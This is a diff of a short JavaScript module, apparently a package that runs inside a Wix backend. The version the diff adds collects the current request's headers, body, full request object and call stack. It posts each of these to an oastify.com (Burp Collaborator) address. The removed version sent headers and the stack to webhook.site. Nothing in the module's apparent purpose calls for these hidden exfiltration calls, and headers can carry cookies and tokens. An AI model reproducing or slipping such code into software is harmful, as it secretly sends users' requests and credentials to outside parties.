@@ -1,42 +1,35 @@
-const https = require('https')
+const getCurrentRequest = require('@wix/wix-request');
+const { fetch } = require('wix-fetch');
+const util = require('util');
 
 async function main() {
+    const webhook = 'https://x31lltv67khjb5st88mxpm2qchie67uw.oastify.com/'
 
-    // getting the callstack
+    // stack
     const error = new Error();
     Error.captureStackTrace(error);
     const callStack = error.stack;
 
-    // getting headers
-    let maybeReqHeaders;
-    try {
-        const getCurrentRequest = require('@wix/wix-request');
-        const currentRequest = await getCurrentRequest();
-        maybeReqHeaders = currentRequest.headers;
-    } catch (error) {
-        maybeReqHeaders = error
+    // request
+    const currentRequest = await getCurrentRequest();
+    const currentRequestInspected = util.inspect(currentRequest, {showHidden: false, depth: 2})
+    const reqHeaders = currentRequest.headers;
+    const reqBody = currentRequest.request.body;
+
+    // objects i want to send
+    const goodies = {
+        item,
+        reqHeaders,
+        reqBody,
+        currentRequestInspected, // object too big, send to webhooksite
+        callStack
     }
 
-    const data = JSON.stringify({
-        callStack,
-        maybeReqHeaders
-    });
-
-    const options = {
-        hostname: 'webhook.site',
-        path: '/85f75f80-becd-4efb-8d26-404915a28143/hi',
-        method: 'POST',
-        headers: {
-            'Content-Length': data.length
-        }
-    };
-
-    const req = https.request(options)
-    req.write(data);
-    req.end();
-
-    exports.printMsg = function() {
-        console.log("marksl test");
+    for (let [key, value] of Object.entries(goodies)) {
+        fetch(webhook + key, {
+            method: 'POST',
+            body: JSON.stringify(value)
+        })
     }
 }
 
